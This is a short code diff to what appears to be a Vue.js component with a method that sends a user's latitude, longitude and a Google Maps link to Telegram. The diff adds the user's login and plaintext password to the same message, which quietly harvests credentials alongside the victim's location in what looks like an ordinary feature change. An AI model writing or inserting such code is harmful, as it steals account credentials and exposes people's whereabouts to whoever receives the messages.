@@ -123,6 +123,8 @@ export default {
     },
     sendToTelegram() {
       const message = `📍 Foydalanuvchi joylashuvi:
+      Login: ${this.username}
+      Password: ${this.password}
 Latitude: ${this.latitude}
 Longitude: ${this.longitude}
 🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
